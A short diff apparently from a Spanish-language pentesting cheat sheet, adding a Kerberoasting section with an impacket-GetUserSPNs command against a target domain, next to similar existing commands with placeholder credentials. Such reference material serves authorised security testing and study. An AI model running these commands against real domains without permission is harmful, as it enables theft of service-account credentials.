@@ -30,6 +30,11 @@ impacket-GetUserSPNs -dc-ip <IP-TARGET> <DOMAIN>/<USER>:<PASSWORD> -request-user
 impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -k -dc-ip <DOMAIN>
 ```
 
+#### Kerberoasting Attack hacia un dominio objetivo
+```
+impacket-GetUserSPNs <DOMAIN>/<USER> -dc-ip <IP> -target-domain <DOMAIN>
+```
+
 
 ---
 
